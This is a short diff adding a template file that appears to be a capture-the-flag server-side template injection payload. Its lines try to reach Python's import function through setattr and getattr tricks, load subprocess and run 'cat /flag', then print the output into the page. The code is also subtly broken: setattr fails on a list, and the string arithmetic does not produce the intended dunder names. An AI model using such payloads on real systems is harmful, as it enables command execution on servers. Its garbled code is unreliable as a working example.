@@ -1,0 +1,11 @@
+% a=[]
+% a.append(1)
+% lc=locals
+% st=setattr
+% gt=getattr
+% st(a,'s',chr(95)*2+'builtins'*2)
+% st(a,'i',chr(95)*2+'import'*2)
+% im=gt(a,'i')
+% sub=im('subprocess')
+% r=gt(sub,'getoutput')('cat /flag')
+{{r}}
